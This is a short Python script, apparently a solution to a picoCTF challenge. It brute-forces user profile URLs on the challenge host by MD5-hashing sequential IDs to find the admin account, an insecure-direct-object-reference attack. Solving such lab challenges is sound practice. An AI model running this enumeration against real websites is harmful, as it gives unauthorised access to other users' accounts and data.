import hashlib
import requests

base_url = "http://crystal-peak.picoctf.net:64766/profile/user/"

print("Starting brute-force...")

for i in range(3001, 3050):
    user_id = str(i)
    md5_hash = hashlib.md5(user_id.encode()).hexdigest()
    
    print(f"TRIED {i}")

    url = f"{base_url}{md5_hash}"
    response = requests.get(url)

    print(response.text)
    
    if "User not found" not in response.text:
        print(f"[!] SUCCESS! Admin ID is likely {user_id}")
        print(f"URL: {url}")
        break
    
    if i % 500 == 0:
        print(f"Checked up to ID {i}...")

print("Done.")